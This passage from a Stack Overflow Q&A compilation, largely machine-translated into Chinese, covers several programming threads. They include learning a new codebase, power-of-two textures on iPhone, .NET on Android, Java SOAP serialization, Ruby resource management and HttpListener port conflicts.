**Analyze Call-Stacks, Top-Down:**

Go through and list on paper or some other medium, but try not to type it -- this gets different parts of your brain engaged (build it out of Legos if you have to) -- function-calls, Objects, and variables that are closest to top-level first. Look at constants and modules, make sure you don't dive into fine-grained features if you can help it.

**MindMap It!:**

Maybe the most important step. Create a *very* rough draft mapping of your *current* understanding of the code. Make sure you run through the mindmap quickly. This allows an even spread of different parts of your brain to (mostly R-Mode) to have a say in the map.

1.  Create clouds, boxes, etc. Wherever you *initially* think they should go on the paper. Feel free to denote boxes with syntactic symbols (e.g. 'F'-Function, 'f'-closure, 'C'-Constant, 'V'-Global Var, 'v'-low-level var, etc). Use arrows: Incoming array for arguments, Outgoing for returns, or what comes more naturally to you.
2.  Start drawing connections to denote relationships. Its ok if it looks messy - this is a first draft.
3.  Make a quick rough revision. Its its too hard to read, do another *quick* organization of it, but don't do more than one revision.

**Open the Debugger:**

1.  Validate or invalidate any notions you had after the mapping. Track variables, arguments, returns, etc.
2.  Track HTTP requests etc to get an idea of where the data is coming from. Look at the headers themselves but don't dive into the details of the request body.

**MindMap Again!:**

Now you should have a decent idea of most of the top-level functionality.

1.  Create a *new* MindMap that has anything you missed in the first one. You can take more time with this one and even add some *relatively* small details -- but don't be afraid of what previous notions they may conflict with.
2.  Compare this map with your last one and eliminate any question you had before, jot down new questions, and jot down conflicting perspectives.
3.  Revise this map if its too hazy. Revise as much as you want, but keep revisions to a minimum.

**Pretend Its Not Code:**

If you can put it into mechanical terms, do so. The most important part of this is to come up with a metaphor for the app's behavior and/or smaller parts of the code. Think of ridiculous things, seriously. If it was an animal, a monster, a star, a robot. What kind would it be. If it was in Star Trek, what would they use it for. Think of many things to weigh it against.

**Synthesis over Analysis:**

Now you want to see not 'what' but 'how'. Any low-level parts that through you for a loop could be taken out and put into a sterile environment (you control its inputs). What sort of outputs are you getting. Is the system more complex than you originally thought? Simpler? Does it need improvements?

**Contribute Something, Dude!:**

Write a test, fix a bug, comment it, abstract it. You should have enough ability to start making minor contributions and **FAILING IS OK :)**! Note on any changes you made in commits, chat, email. If you did something dastardly, you guys can catch it before it goes to production -- if something *is* wrong, its a great way to get a teammate to clear things up for you. Usually listening to a teammate talk will clear a lot up that made your MindMaps clash.

In a nutshell, the most important thing to do is use a top-down fashion of getting as many different parts of your brain engaged as possible. It may even help to close your laptop and face your seat out the window if possible. Studies have shown that enforcing a deadline creates a "Pressure Hangover" for ~2.5 days after the deadline, which is why deadlines are often best to have on a Friday. So, **BE RELAXED, THERE'S NO TIMECRUNCH, AND NOW PROVIDE YOURSELF WITH AN ENVIRONMENT THAT'S SAFE TO FAIL IN**. Most of this can be fairly rushed through until you get down to details. Make sure that you don't bypass understanding of high-level topics.

Hope this helps you as well :)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2018-11-14T16:20:23.547

这里所有非常好的答案。只是想添加更多的东西：

人们可以将架构理解与闪存卡结合起来，重新访问这些卡片可以巩固理解。我发现诸如“代码的哪一部分具有 X 功能？”之类的问题，其中 X 在您的代码库中可能是一个有用的功能。

我还喜欢在 emacs 中打开一个缓冲区并开始重写我想熟悉的代码库的某些部分并添加我自己的注释等。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-18T07:04:12.803

vi 和 emacs 用户可以做的一件事是使用标签。标签包含在一个文件中（通常称为 TAGS ）。您可以通过命令生成一个或多个标签文件（ etags 用于 emacs vtags 用于 vi ）。然后我们编辑源代码，您会看到一个令人困惑的函数或变量，您加载标签文件，它将带您到声明函数的位置（不够完美）。实际上，我已经编写了一些宏，让您可以使用 Alt 光标导航源代码，有点像许多 UNIX 风格中的 popd 和 pushd。

布巴

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-18T08:41:41.953

在开始编写代码之前，我做的第一件事是使用应用程序（作为几个不同的用户，如有必要）了解所有功能并查看它们如何连接（信息如何在应用程序内流动）。

之后，我检查了构建应用程序的框架，以便我可以在我刚刚看到的所有界面与一些视图或 UI 代码之间建立直接关系。

然后我查看数据库和任何数据库命令处理层（如果适用），以了解这些信息（用户操作的）是如何存储的，以及它是如何进入和来自应用程序的

最后，在了解了数据的来源和显示方式之后，我查看了业务逻辑层以了解数据是如何转换的。

我相信每个应用程序架构都可以像这样划分，并且在真正调试它或添加新东西之前了解整体功能（你的应用程序中的谁）可能是有益的 - 也就是说，如果你有足够的时间这样做。

是的，与开发当前版本软件的人交谈也很有帮助。但是，如果他/她即将离开公司，请在他/她的愿望清单上记下（他们想为该项目做什么，但由于预算限制而无法做到）。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-11-04T12:22:43.330

为您从代码库中找到的每一件事创建文档。通过实验找出它是如何工作的——在这里和那里改变几行，看看会发生什么。使用 geany，因为它可以加快程序中常用变量和函数的搜索速度，并将其添加到自动完成中。了解您是否可以通过 facebook 或通过谷歌搜索联系代码库的原始开发人员。找出代码的原始目的，看看代码是否仍然符合该目的，或者是否应该从头开始重写，以实现预期目的。

找出代码使用了哪些框架，他们使用了哪些编辑器来生成代码。

推断代码如何工作的最简单方法是实际复制您将如何完成某个部分并重新检查代码是否存在这样的部分。

这是逆向工程——通过尝试重新设计解决方案来解决问题。

大多数计算机程序员都有编码经验，如果代码中存在某些模式，您可以查找这些模式。

有两种类型的代码，面向对象的和面向结构的。

如果你知道如何做这两件事，你很高兴，但如果你不熟悉其中一个，你必须重新学习如何以这种方式编程，以理解为什么它是这样编码的。

在面向对象的代码中，您可以轻松地创建记录每个对象类的行为和方法的图表。

如果它是面向结构的（按功能表示），请创建一个功能列表，记录每个功能的作用以及它在代码中的位置。

我自己没有做过上述任何一项，因为我是一名网络开发人员，从 index.php 开始到其他页面的其余部分，相对容易弄清楚某些东西是如何工作的。

祝你好运。

# iphone - 为什么 iPhone 上的纹理图像需要二维的幂？

> ID：214608
> 
> 赞同：11
> 
> 时间：2008-10-18T05:06:40.263
> 
> 标签：iphone

我正在尝试解决 iphone 上的闪烁问题（打开 gl es 游戏）。我有一些没有二维尺寸的图像。我将用具有适当尺寸的图像替换它们......但是为什么尺寸需要是 2 的幂？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-10-18T05:30:42.757

大多数系统（甚至许多现代显卡）需要 2 次幂纹理的原因是 mipmapping。

**什么是 mipmap？**

将创建较小版本的图像，以使事物在非常小的尺寸下看起来正确。图像反复除以 2 以生成新图像。

所以，想象一个 256x128 的图像。这将创建尺寸为 128x64、64x32、32x16、16x8、8x4、4x2、2x1 和 1x1 的较小版本。

如果这张图片是 256x192，它可以正常工作，直到你缩小到 4x3 的大小。下一个较小的图像将是 2x1.5，这显然不是有效的尺寸。一些图形硬件可以处理这个问题，但许多类型不能。

一些硬件也需要一个方形图像，但这已经不是很常见了。

**为什么需要 mipmapping？**

想象一下，您有一张非常远的图片，距离只有 4 个像素大小。现在，当绘制每个像素时，将选择图像上的一个位置作为该像素的颜色。所以你最终得到的 4 个像素可能根本不能代表整个图像。

现在，想象图片在移动。每次绘制新帧时，都会选择一个新像素。因为图像距离很远，所以你很可能会看到非常不同的颜色，因为运动的微小变化。这会导致非常难看的闪烁。

缺少 mipmapping 会导致任何小于纹理大小的大小出现问题，但当图像被绘制到非常少的像素时，这种问题最为明显。

使用 mipmap，硬件将可以访问 2x2 版本的纹理，因此其上的每个像素都是图像该象限的平均颜色。这消除了奇怪的颜色闪烁。

[http://en.wikipedia.org/wiki/Mipmap](http://en.wikipedia.org/wiki/Mipmap)

对那些说这不再正确的人进行编辑：确实，许多现代 GPU 可以支持非二次幂纹理，但许多不能支持也是事实。

事实上，就在上周，我正在开发的一个 XNA 应用程序中有一个 1024x768 的纹理，它在一台使用了大约一年的笔记本电脑上导致游戏加载时崩溃。不过，它在大多数机器上运行良好。可以肯定的是，iPhone 的 gpu 比完整的 PC gpu 简单得多。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T05:10:34.250

通常，图形硬件本身就可以使用 2 次方维度的纹理。我不确定导致这种情况的实施/构造细节，但它通常是无处不在的。

编辑：经过一些研究，我发现我的知识有点过时了——现在很多现代显卡都可以处理任意纹理大小。我可以想象，由于手机图形处理器的空间限制，他们可能需要省略任何需要额外硅的东西。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-01-17T17:05:57.760

1.  您可以在此处找到有关 Apple Ipod/Iphone 设备的 OpenGL ES 支持信息： [Apple OpenES 支持](http://developer.apple.com/library/ios/#documentation/3DDrawing/Conceptual/OpenGLES_ProgrammingGuide/OpenGLESPlatforms/OpenGLESPlatforms.html)
2.  OpenGL ES 2.0 被定义为等于 OpenGL 2.0
3.  纹理大小的限制仅在 2.0 版本中消失了因此，如果您使用版本低于 2.0 的 OpenGL ES - 这是正常情况。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T05:17:45.890

我想这是一个相当不错的图形硬件优化来假设 2 次幂纹理。我买了一台新的笔记本电脑，带有最新的笔记本电脑图形硬件，如果纹理不是 Maya 中的 2 次幂，那么渲染就会一团糟。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-08-19T08:34:40.730

您是否使用 PVRTC 压缩？这需要 2 的幂和正方形图像。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T05:41:31.910

尝试在软件中实现包装纹理映射，您会很快发现为什么需要 2 的幂大小。

简而言之，你会发现如果你可以假设二维的幂，那么很多整数乘法和除法都会变成位移。

我大胆猜测，最近放松这一限制的趋势是由于 GPU 转向浮点数学。

**编辑：** “因为 mipmapping”的答案不正确。Mipmapped、非二次幂纹理是现代 GPU 的一个共同特征。

# android - Google Android 会支持 .NET 吗？

> ID：214615
> 
> 赞同：253
> 
> 时间：2008-10-18T05:14:45.147
> 
> 标签：android, .net, mono

现在带有 Google 的 Android 操作系统的 G1 现已上市（很快），Android 平台会支持 .Net 吗？

* * *

## 回答 #1

> 赞同：325
> 
> 时间：2009-01-07T19:09:50.680

**更新**：自从两年前我写了这个答案以来，我们将 Mono 产品化为在 Android 上运行。这项工作包括几个步骤：将 Mono 移植到 Android，将其与 Visual Studio 集成，在 Mac 和 Windows 上为 MonoDevelop 构建插件，并将 Java Android API 公开给 .NET 语言。现在可以在[http://monodroid.net](http://monodroid.net)

*   入门： http: [//monodroid.net/Welcome](http://monodroid.net/Welcome)
*   文档： http: [//monodroid.net/Documentation](http://monodroid.net/Documentation)
*   教程： http: [//monodroid.net/Tutorials](http://monodroid.net/Tutorials)

Android 上的 Mono 基于 Mono 2.10 运行时，默认使用 C# 4.0 编译器的 4.0 配置文件，并使用 Mono 的新 SGen 垃圾收集引擎，以及我们新的跨 Java 和 Mono 执行 GC 的分布式垃圾收集系统。

* * *

以下链接反映了截至 2009 年 1 月 Android 上的 Mono，我将它们保留为历史背景

由于 Koushik Dutta 和 Marc Crichton 的工作，Mono 现在可以在 Android 上运行。

你可以在这里看到它运行的视频：[http ://www.koushikdutta.com/2009/01/mono-on-android-with-gratuitous-shaky.html](http://www.koushikdutta.com/2009/01/mono-on-android-with-gratuitous-shaky.html)

您可以在此处获取自己构建 Mono 的说明：[http ://www.koushikdutta.com/2009/01/building-mono-for-android.html](http://www.koushikdutta.com/2009/01/building-mono-for-android.html)

您可以在此处获得比较 Mono 的 JIT 与 Dalvik 解释器的基准：[http ://www.koushikdutta.com/2009/01/dalvik-vs-mono.html](http://www.koushikdutta.com/2009/01/dalvik-vs-mono.html)

当然，您可以在此处获得使用 Mono 的预配置图像（有关使用该图像的详细信息，请转到帖子底部）：[http ://www.koushikdutta.com/2009/01/building-mono-for- android.html](http://www.koushikdutta.com/2009/01/building-mono-for-android.html)

* * *

## 回答 #2

> 赞同：78
> 
> 时间：2008-10-18T05:26:52.220

是的，这将是可能的，而且不会那么困难。此时开始需要的只是某种将 MSIL 转换为[Dalvik 字节码](http://en.wikipedia.org/wiki/Dalvik_virtual_machine)的转换器。由于这两种格式都是开源的并且有据可查，所以不会有任何问题。

因此，用 C# 或 VB.NET 编写 Android 应用程序将成为可能，问题是将支持多少 .NET 框架标准库。但这是另一个问题。

> **奥斯卡雷耶斯写道：**
> 
> 我很确定如果谷歌对 .net 有任何兴趣，他们会在 Android 处于第一阶段而不是现在处于生产阶段时设计一些东西。我不是说不可能，我是说他们不感兴趣。也许在 mmm hhhh 10 年。

实际上他们已经设计的*非常兼容*Java和.NET

他们不能一次做所有事情，但是如果你查看 Android SDK，有一个名为**dx**的工具。该工具将 Java 字节码转换为 Dalvik 字节码，也就是说，您今天可以毫不费力地在 Android 上运行用 Java 编写的程序。现在.NET 也需要同样的工具。

考虑到 .NET 和 Java 的相似程度，这确实是时间问题。

> **ddimitrov 写道：**
> 
> .Net->Java->Dalvik 翻译现在也可以完成（[http://dev.mainsoft.com/](http://dev.mainsoft.com/)），但我认为你低估了.Net 库的缺乏。当然有人可以移植 Mono，但这绝对是一项不平凡的工作。

无需移植 Mono。Android 已经有了 VM 和一些基本的 API。所需要的只是 CIL->Dalvik 转换器和用于 Android API 的微型 .NET 包装器（可能还有一些标准 .NET 类的一些基本实现）。就是这样。

**更新：** .NET 已经在 Android 上运行 - 您将需要如上所述的 Monodroid ( [http://monodroid.net](http://monodroid.net) ) 产品。

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2010-03-04T04:16:30.617

Miguel de Icaza 于 2010 年 2 月 17 日在他的[博客](http://tirania.org/blog/archive/2010/Feb-17.html)上宣布，他们正在着手开发用于 android 的 mono，将被称为 MonoDroid。

这将类似于 iphone 上的 MonoTouch，但适用于 android。

它将提供与 android UI 的绑定，因此应用程序的外观和感觉都是实时的原生 android 应用程序。这将要求您编写一个特定于 android 的 UI。

但是，您将能够重用现有的较低级别的库，而无需重新编译。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2010-05-24T14:39:57.883

由于这是在 Google 上搜索 Android 和 .net 支持时的第一个链接，因此只适合在此处发布。

mono 项目正在开发一个 SDK，以使用 C# 等 CIL 语言开发 Android 应用程序。不利的一面是它将是一个商业产品。[单机器人](http://go-mono.com/monodroid/)

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2010-08-20T08:58:26.837

有适用于 Android 的 Mono，它是为 Android 移植的 .NET 框架。还有 MonoDroid，一个使用 C# 和核心 .NET API 开发基于 Android 的应用程序的开发堆栈。MonoDroid Preview 1 已于几天前发布。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2011-01-08T11:28:42.350

MonoDroid 可供预览。我认为这将弥合差距。然而，MonoDroid 可能是一个昂贵的开发选择。他们的其他开发工具的价格在 199 美元到 4000 美元之间（MonoTouch .. iPhone 开发工具……的价格在 399 美元到 3999 美元之间）。如果人们使用这些工具开发应用程序，他们需要一个非常强大的商业模式才能看到一些回报。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-10-18T13:35:24.573

看看这个[xmlvm](http://www.xmlvm.org/overview/)我认为这是可能的。可能也可以查看此[视频](http://youtube.com/?v=s8nMpi5-P-I)

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-10-18T06:09:17.330

[Mono](http://www.mono-project.com/Main_Page)的修改端口也是完全可能的。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-11-17T11:14:49.523

.NET 紧凑框架已移植到 Symbian OS ( [http://www.redfivelabs.com/](http://www.redfivelabs.com) )。如果 .NET 作为一个“封闭”平台可以移植到这个平台，我看不出有什么理由不能为 Android 做。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2010-01-24T12:49:59.877

.NET 和 Mono 是很好的环境，有许多工具和知道如何使用它们的人的优秀技能基础。

我认为 Mono 有机会成为首选的移动跨平台开发环境，因为它们是 iPhone 上 Objective-C 的唯一替代品，并且应该可以移植到 Android，而 .NET 已经在 Windows Mobile 上。

我真的希望在 Android 上看到 Mono 的可靠实现，以及 Android API 的包装器和 Monotouch 一样，并且愿意为此付费，因为我自己无法做到这一点。

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2008-12-16T22:51:41.417

您更有可能看到 Silverlight 的 Android 实现。微软代表已经确认这是可能的，与代表说有问题的 iPhone 相比。

但是.Net 框架的一个版本是可能的。只需要有人这么关心它:)

但实际上，从 C# 迁移到 Java 并不是什么大问题，考虑到这两个平台（PC 与 G1）之间的巨大差异，您似乎不太可能为任何应用程序使用一个代码库。你想在两者上运行。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2009-01-03T19:41:49.667

在我看来，将 CLI 字节码转换为 Dalvik，并为一些核心功能（如集合、文件访问等）编写包装类在技术上是可行的，即使这将是一项艰苦的工作。

但是在 android 上运行的 .NET 桌面应用程序会让人感觉很陌生，因为它会有一个经典的类似 Windows 的 GUI，在触摸设备上不太可用。另一方面，如果您要在 .NET 中编写类似 android 的 GUI，则需要另一组包装器（请注意，包装器与上面提到的包装器相反）。

我不确定 .NET 移动应用程序是否会在 android 上感觉是原生的，但我猜它不会。

也许您对另一种方法感兴趣：您可以用 Java 语言编写应用程序。然后，您可以通过 Microsoft J# 将其编译为 .NET（我知道它已停产，但您仍然可以下载并使用它）并在 android 上使用相同的 Java 代码。同样，这是针对核心类，也就是业务逻辑，您必须再次编写两个 GUI。也许您也可以标记 J2ME，如果您使用 .NET，您将无法做到这一点。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2010-08-18T21:27:09.120

.NET for Android 对我来说似乎是一种真正的可能性。有消息称，微软将发布适用于 Android 的 Silverlight——永远不要低估微软将引导到苹果的优势。一款速度更快、功能更丰富、开发生命周期更快、令人印象深刻的硬件、Flash 和 Silverlight 作为标准安装的智能手机。

微软对改进 Android 有着既得利益，同时，将为 Android 上的 Silverlight 开发应用程序也将在具有多点触控、GPS 等功能的 Windows Phone 7 操作系统上运行。

# java - 将对象作为 SOAP 请求的一部分传递并将对象作为响应返回......使用 web 服务

> ID：214622
> 
> 赞同：2
> 
> 时间：2008-10-18T05:18:26.357
> 
> 标签：java, web-services

我有一个网络服务，它将 java.lang.object 对象作为参数（因为在运行时只知道对象的 hte 类型）......在完成处理后，回复响应设置 java.lang.Object 给它。

我能够从调用程序将最重要的对象发送到 web 服务，但是在构建来自 web 服务的响应时得到 NotSerializable 异常。

我开始知道'如果我们实现 java.io.serializable，mebmers 也应该是可序列化的对象'......这里 Object 不是可序列化的对象......它没有实现 Serializable......

如果有人可以用正确的解决方案指导 mw..我将不胜感激。

谢谢巴斯卡

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T09:37:03.197

> I have a webservice, which takes java.lang.object objects as parameters (because at runtime only know hte type of object)

This part worries me. Not knowing the type while programming is a code smell. If you have no idea what it is, how can you make code to handle it?

There could be a legitimate reason to do what you are trying to accomplish, but usually there is a better way. The real question here may be: "How should I design my webservice and code, to handle my requirements?"

When a method accepts "Object" or other extremely general types, they often contain a switch-like structure which checks for certain types and handles them differently, and "unknown" types either throws an exception, or (worse) may simply be ignored. The solution here is probably to create a new method for each type. And it doesn't really matter if it is just a usual Java method, or if it is a webservice.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T09:29:35.910

To solve your immediate problem, you should accept a "Serializable" in stead of "Object". Then you need to make your class serializable. If you can't do that, you will never be able to transfer the object over a webservice.

This is the core you must understand: *If it can be transferred over a webservice, that means it is possible to serialize it. If it is possible to serialize it, it is possible to make it a Serializable.*

If you can't modify the class itself, you can work around the problem. For example you can create a new Serializable class, which can read all relevant info from your object.

To say that all members of a Serializable class needs to Serializable too is not the complete truth. All needed data needs to be serializable, but the classes themselves does not need to implement the Serializable interface.

The alternative is to implement these two methods:

```
private void writeObject(java.io.ObjectOutputStream out) throws IOException;
private void readObject(java.io.ObjectInputStream in) throws IOException, classNotFoundException; 
```

There is an article about serialization here: [Discover the secrets of the Java Serialization API](http://java.sun.com/developer/technicalArticles/Programming/serialization/)

It describes how to use these two methods under "Customize the Default Protocol".

If that isn't advanced enough, keep in reading under "Create Your Own Protocol: the Externalizable Interface" to see how to implement the Externalizable interface (a subinterface to Serializable), which gives you complete control over the serialization process.

(I am ignoring the "transient" feature for simply ignoring non-serializable data, since I assume that you need them. If my assumption is wrong, read the part "Nonserializable Objects".)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T06:37:55.977

将对象序列化为字节数组，并在您的 SOAP 调用中将其返回，然后将对象从客户端的字节数组中编组回来。SOAP 可以轻松有效地处理字节数组，并且序列化将是 SOAP 事务范围之外的实现细节。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T06:33:41.290

如果该类的成员没有实现 Serializable，那么您就不能对其使用本机 Java 序列化。这基本上就是您的错误消息告诉您的内容。

如果您不能使底层对象实现 Serializable，那么您可能必须找到一种不同的序列化方法来传入和传出 Web 服务。Java 中流行的变种是 XML、JSON、AMF，尽管您总是可以自己滚动。

如果您在请求的任一端都有 Java 对象，请确保将代码分解，以便您的序列化和反序列化代码位于可以在两端使用的库中。这将大大减轻您在实现中的测试负担。

我建议将所有序列化代码保留在域对象本身之外。考虑使用工厂模式来创建对象。

高温高压

# asp.net - 在 Visual Studio 中，我的设计视图不加载母版页控件。为什么？

> ID：214640
> 
> 赞同：1
> 
> 时间：2008-10-18T05:38:19.000
> 
> 标签：asp.net, visual-studio, hresult, design-view

就是这么多`HRESULT E_FAIL`，如果你知道我在说什么。

如果您使用 Visual Studio，您就会知道我在说什么。

类似的线程，但不是重复的：[Visual Studio 中 aspx 页面的设计视图有用吗？](https://stackoverflow.com/questions/196001/is-the-design-view-for-aspx-pages-in-visual-studio-useful)

任何见解，包括来自 Microsoft MVP 的输入（哦，我知道你在那里）都会非常酷。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-01-27T14:29:44.870

可能有一些可能的原因。

第一种是如果您创建了一个 Web 表单 (aspx) 页面，将其与母版页嵌套；在子页面上，您注册了一个您开发页面的控件。

总之我想说。

您将子页面嵌套在母版页中，但在该子页面上您只注册了一些控件，没有其他任何内容。因此，您只能在该子页面上查看母版页。

您无法在控制器页面上看到母版页。

因为控制器页面只是部分页面，所以它们不会加载母版页。

母版页 <- 子页 <- 在子页上注册了一个控件

```
<%@ Register Src="Ctrl_AdminReports.ascx" TagName="Ctrl_AdminReports" TagPrefix="uc1" %> 
```

您只能访问其直接子级的母版页控件。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2010-07-19T19:02:39.887

Try this: Put your MasterPages in a seperate folder (if they aren't already. Call it `masterpages`. Then add this to your `web.config`:

```
<location path="MasterPage">
<system.web>
  <authorization>
    <allow users="?" />
  </authorization>
</system.web> 
```

This will allow anonymous access to that folder and allow access to the masterpage. Also, are these nested masterpages?

# ruby - Ruby 中的 RAII（或者，如何在 Ruby 中管理资源）

> ID：214642
> 
> 赞同：10
> 
> 时间：2008-10-18T05:40:26.390
> 
> 标签：ruby, resources, destructor, raii, finalizer

我知道这是设计使然，您无法控制对象被销毁时会发生什么。我也知道将一些类方法定义为终结器。

但是，C++ 的 RAII 的 ruby​​ 习语是（资源在构造函数中初始化，在析构函数中关闭）吗？即使发生错误或异常，人们如何管理对象内部使用的资源？

使用*确保*工作：

```
f = File.open("testfile")
begin
  # .. process
rescue
  # .. handle error
ensure
  f.close unless f.nil?
end 
```

但是该类的用户必须记住每次需要调用 open 方法时 **都要执行整个 begin-rescue-ensure chacha 。**

例如，我将有以下课程：

```
class SomeResource
 def initialize(connection_string)
   @resource_handle = ...some mojo here...
 end

 def do_something()
   begin
    @resource_handle.do_that()
    ...
   rescue
    ...
   ensure
 end

 def close
  @resource_handle.close
 end

end 
```

如果异常是由其他类引起的并且脚本退出，则不会关闭 resource_handle。

还是更多的问题是我仍然在做这件事太像 C++？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-07-03T04:39:20.473

这样用户就不必“*必须记住做整个 begin-rescue-ensure chacha* ” 将`rescue`/`ensure`与`yield`.

```
class SomeResource
  ...
  def SomeResource.use(*resource_args)
    # create resource
    resource = SomeResource.new(*resource_args) # pass args direct to constructor
    # export it
    yield resource
  rescue
    # known error processing
    ...
  ensure
    # close up when done even if unhandled exception thrown from block
    resource.close
  end
  ...
end 
```

客户端代码可以如下使用它：

```
SomeResource.use(connection_string) do | resource |
  resource.do_something
  ... # whatever else
end
# after this point resource has been .close()d 
```

事实上，这就是`File.open`运作方式——让第一个答案充其量是令人困惑的（对*我的*同事来说是这样）。

```
File.open("testfile") do |f|
  # .. process - may include throwing exceptions
end
# f is guaranteed closed after this point even if exceptions are 
# thrown during processing 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-18T06:09:37.390

`yield`将资源添加到块中怎么样？例子：

```
File.open("testfile") do |f|
  begin
    # .. process
  rescue
    # .. handle error
  end
end 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-11-29T23:30:04.417

> 还是更多的问题是我仍然在做这件事太像 C++？

是的，因为在 C++ 中，资源释放隐含地发生在堆栈上的所有内容中。堆栈展开=资源销毁=调用析构函数，然后可以释放东西。由于 Ruby 没有析构函数，因此没有“在其他所有事情都完成后做”的地方，因为抓取收集可以从你所在的位置延迟几个周期。您确实有终结器，但它们被称为“处于边缘”（并非所有东西都可用）并且它们在 GC 上被调用。

因此，如果您持有一些更好地释放的资源的句柄，则需要显式释放它。确实，处理这种情况的正确习语是

```
def with_shmoo
  handle = allocate_shmoo
  yield(handle)
ensure
  handle.close
end 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-18T05:49:27.493

见[http://www.rubycentral.com/pickaxe/tut_exceptions.html](http://www.rubycentral.com/pickaxe/tut_exceptions.html)

在 Ruby 中，您将使用以下`ensure`语句：

```
f = File.open("testfile")
begin
  # .. process
rescue
  # .. handle error
ensure
  f.close unless f.nil?
end 
```

这对于 Python、Java 或 C# 的用户来说很熟悉，因为它的工作方式类似于 try/catch/finally。

# exception - 使用 C#.NET 2.0 在 IIS 上启动多个 HTTP 侦听器

> ID：214644
> 
> 赞同：7
> 
> 时间：2008-10-18T05:43:07.383
> 
> 标签：exception, iis-6, listeners, httplistener

我有两个 Windows 服务在同一台机器上运行。这两项服务都使用

私有 HttpListener 监听器；

我将每个服务的 baseURL 分别指定为“ [http://IPAddress:8080/](http://IPAddress:8080/) ”和“ [http://IPAddress:8081/](http://IPAddress:8081/) ”。然后我做必要的事情并打电话

listener.Start();

第一个服务在 8080 端口成功启动。但是，当我现在启动第二个服务时，我收到 HTTPListenerException “进程无法访问文件，因为它正在被另一个进程使用”作为侦听器对象。

谁能告诉我： 1) 如果可以在同一个 IIS 上的两个不同端口上启动两个 HTTP 侦听器。2）如果是，我们怎样才能做到这一点？3）有没有其他方法可以做到这一点？

供您参考：我正在使用 C#.NET 2.0 和 IIS 6.0 服务器。

感谢和问候，

哈里

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-18T07:55:45.337

HttpListener 不独立于 IIS 工作吗？你能停止 IIS 服务，看看会发生什么吗？

或者端口 8081 可能**被另一个程序**或进程使用。我建议尝试将端口设置为另一个数字。您可以在启动服务之前打开命令行并执行“ [netstat](http://en.wikipedia.org/wiki/Netstat) ”命令来查看**端口是否被使用。**

[![替代文字](https://i.stack.imgur.com/uqVPV.gif)](https://i.stack.imgur.com/uqVPV.gif)
[（来源：[googlepages.com](http://simpleinformation213421.googlepages.com/netstat_ano.gif)）]

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T08:28:48.233

HTTPListener 确实不是 IIS 的一部分。这只是 C# 代码。

你是这样做的吗？

```
String[] prefixes = { "http://localhost:8280/", "http://localhost:8281/"};

HttpListener listener = new HttpListener();
listener.Prefixes.Add("http://localhost:8280/");
listener.Start(); 
```

> 1) 如果可以在同一 IIS 上的两个不同端口上启动两个 HTTP 侦听器。

是的。但是 IIS 上的侦听器不是通过代码创建的，而是通过 IIS 管理工具创建的，所以这可能不是您想要做的。IIS 与您尝试的 c# 代码是分开的。

> 2）如果是，我们怎样才能做到这一点？

*   尝试一些其他端口号（如 58080 和 58081）并尝试将“IPAddress”替换为“localhost”。您的端口号很可能被其他 Web 服务器使用

> 3）有没有其他方法可以做到这一点？

如果您尝试提供网页服务，您可能不想制作 Web 应用程序而不是制作自己的 HTTP 服务器

如果您正在做一些自定义的事情，您可能想看看 WCF（Windows 通信基础），因为它是 Web、套接字、Web 服务等的新框架，并且是 MS 未来将使用的

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-06-15T23:18:32.813

[使用端口号时，快速浏览此](http://www.iana.org/assignments/port-numbers)页面通常是个好主意……只是为了确保您尝试使用的临时号尚未在使用中。

# c# - 如何在不修改类的情况下添加 XML 序列化指令

> ID：214645
> 
> 赞同：2
> 
> 时间：2008-10-18T05:47:02.943
> 
> 标签：c#, vb.net, xml-serialization

有没有一种巧妙的方法可以在不修改序列化类的情况下添加 XML 序列化指令？

我不喜欢默认的序列化，也不能修改类。我正在考虑继承该类，并使用 Shadows (VB.NET) 重新实现属性（使用序列化指令），但这会导致大量重复代码并且看起来很糟糕。

我正在寻找的理想解决方案基本上是将所有序列化指令保存在单独文件中的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-19T04:54:43.560

您是否考虑过使用 XmlAttributeOverrides？

[.NET Framework 类库：XmlAttributeOverrides 类](http://msdn.microsoft.com/en-us/system.xml.serialization.xmlattributeoverrides.aspx)

> 首先，您可以控制和增强在 DLL 中找到的对象的序列化——**即使您无权访问源代码**；
> 
> 其次，您可以创建一组可序列化的类，但以**多种方式****序列化对象** 。例如，您可以将它们序列化为 XML 属性，而不是将类实例的成员序列化为 XML 元素，从而提高文档传输效率。

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-18T06:24:24.007

使用反射从类中获取所有属性的值，然后将它们作为属性写入 XmlNode

```
PropertyInfo[] properties = control.GetType().GetProperties();
foreach (PropertyInfo property in properties)
